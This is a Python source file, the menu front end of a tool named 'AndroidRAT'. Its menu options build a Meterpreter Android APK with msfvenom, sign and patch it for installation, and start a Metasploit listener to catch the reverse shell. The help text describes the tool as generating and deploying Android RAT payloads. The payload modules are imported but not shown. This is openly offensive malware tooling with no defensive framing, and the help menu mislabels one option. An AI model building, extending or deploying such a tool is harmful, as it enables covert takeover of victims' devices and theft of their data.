import sys
from builder import payload_generator, apk_signer, metasploit_handler, apk_patcher

def main_menu():
    while True:
        print("\n" + "="*30)
        print("   AndroidRAT Main Menu")
        print("="*30)
        print("[1] Build Android Payload (APK)")
        print("[2] Start Metasploit Listener")
        print("[3] Sign APK")
        print("[4] Patch APK for Visible UI")
        print("[5] Show Help & Exit")
        choice = input("Select an option: ").strip()

        if choice == "1":
            payload_generator.build_payload()
        elif choice == "2":
            start_metasploit_listener()
        elif choice == "3":
            apk_signer.sign_apk()
        elif choice == "4":
            patch_apk_for_visible_ui()
        elif choice == "5":
            show_help()
            sys.exit(0)
        else:
            print("Invalid selection. Please enter a valid option.")

def start_metasploit_listener():
    lhost = input("Enter LHOST (your IP): ").strip()
    lport = input("Enter LPORT (listen port): ").strip()
    # You can allow the user to select payload if needed, for now use default.
    metasploit_handler.start_handler(lhost, lport)

def patch_apk_for_visible_ui():
    print("\n--- Patch APK for Visible UI ---")
    input_apk = input("Enter path to Meterpreter APK (input): ").strip()
    output_apk = input("Enter path for patched APK (output): ").strip()
    apk_patcher.patch_apk(input_apk, output_apk)

def show_help():
    print("\n--- Help & Usage ---")
    print("This tool helps you generate, sign, and deploy Android RAT payloads.")
    print("Menu options:")
    print("  [1] Build Android Payload: Create a Meterpreter APK using msfvenom.")
    print("  [2] Start Metasploit Listener: Launch a handler to catch the reverse shell.")
    print("  [3] Sign APK: Sign an APK so it can be installed on Android devices.")
    print("  [4] Help & Exit: Show this message and exit.")

if __name__ == "__main__":
    main_menu()
